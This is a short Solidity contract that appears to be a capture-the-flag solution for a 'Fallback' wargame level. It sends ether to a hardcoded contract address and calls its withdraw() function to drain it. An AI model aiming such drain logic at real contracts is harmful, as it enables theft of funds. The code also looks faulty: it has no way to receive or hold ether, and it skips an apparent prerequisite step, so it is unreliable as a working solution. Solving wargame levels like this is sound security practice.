// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

//import '@openzeppelin/contracts/math/SafeMath.sol';

contract FallbackSolution {

    function solve() public {
        address contractAddr = 0x9CB391dbcD447E645D6Cb55dE6ca23164130D008;
        contractAddr.call{value: 0.0001 ether}("");
        (bool success,) = contractAddr.call(abi.encode(bytes4(keccak256("withdraw()"))));
        if(!success)
            revert();
    }
}

